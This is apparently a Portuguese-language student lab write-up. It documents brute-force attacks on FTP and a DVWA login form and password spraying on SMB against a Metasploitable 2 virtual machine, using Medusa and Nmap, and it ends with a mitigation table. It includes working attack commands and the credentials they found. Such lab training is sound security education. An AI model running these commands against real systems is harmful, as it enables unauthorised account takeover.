# 🔐 Brute Force com Medusa e Kali Linux

Projeto desenvolvido para o desafio da DIO sobre segurança ofensiva. Documentei simulações de ataques de força bruta em ambiente local controlado usando Kali Linux e a ferramenta Medusa.

---

## 🖥️ Ambiente

| Componente | Descrição |
|---|---|
| Máquina atacante | Kali Linux 2024.x |
| Máquina alvo | Metasploitable 2 — `192.168.56.101` |
| Rede | Host-Only no VirtualBox (isolada) |
| Ferramenta | Medusa v2.2 + Nmap |

---

## 🧪 Cenários Testados

### 1. Força Bruta em FTP

Testei credenciais padrão no serviço FTP do Metasploitable usando uma wordlist simples.

```bash
medusa -h 192.168.56.101 -u msfadmin -P wordlist_ftp.txt -M ftp
```

```
ACCOUNT FOUND: [ftp] User: msfadmin Password: msfadmin [SUCCESS]
```

### 2. Força Bruta em Formulário Web (DVWA)

Com o DVWA configurado no nível de segurança **Low**, automatizei tentativas de login no formulário.

```bash
medusa -h 192.168.56.101 -u admin -P wordlist_web.txt -M http \
  -m DIR:/dvwa/vulnerabilities/brute/ \
  -m DENY-SIGNAL:"Username and/or password incorrect."
```

```
ACCOUNT FOUND: [http] User: admin Password: password [SUCCESS]
```

### 3. Password Spraying em SMB

Primeiro enumerou os usuários com Nmap, depois testei uma senha por vez contra todos — técnica que evita bloqueios por conta.

```bash
# Enumeração
nmap --script smb-enum-users -p 445 192.168.56.101

# Spraying
medusa -h 192.168.56.101 -U users.txt -P wordlist_smb.txt -M smbnt -t 1
```

```
ACCOUNT FOUND: [smbnt] User: msfadmin Password: msfadmin [SUCCESS]
ACCOUNT FOUND: [smbnt] User: service  Password: service   [SUCCESS]
```

---

## 🛡️ Mitigações

| Ataque | Como prevenir |
|---|---|
| Força bruta geral | Bloqueio de conta após tentativas falhas, MFA, senhas fortes |
| FTP | Substituir por SFTP, configurar Fail2Ban |
| Web | Token CSRF, rate limiting, WAF |
| SMB | Desabilitar SMBv1, monitorar falhas de logon (Event ID 4625) |

---

## 📝 O que aprendi

Ficou claro como credenciais padrão são um risco real e fácil de explorar. O Medusa é simples de usar e funciona em vários protocolos com a mesma lógica. O password spraying me chamou atenção por ser mais difícil de detectar que a força bruta tradicional. No geral, entender o lado ofensivo ajuda muito a pensar em defesa.

---

## 🔗 Referências

- [Kali Linux](https://www.kali.org/)
- [Medusa](http://www.foofus.net/jmk/medusa/medusa.html)
- [DVWA](http://www.dvwa.co.uk/)
- [Nmap](https://nmap.org/book/)
